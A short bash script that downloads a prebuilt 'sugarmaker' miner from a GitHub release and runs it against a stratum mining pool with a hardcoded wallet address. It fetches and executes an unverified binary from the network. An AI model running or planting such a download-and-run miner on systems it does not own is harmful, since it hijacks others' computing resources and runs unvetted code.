#!/bin/bash

wget https://github.com/Zeusyf/Tool-miner-beta/releases/download/Toolsauto/sugar.tar.gz
tar -xvf sugar.tar.gz
cd sugar
chmod +x ./sugarmaker_ryzen
./sugarmaker_ryzen -a YespowerTide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TEn37NdPcViTnnTgN7ZxQtJjcQ9oG37qDM.b

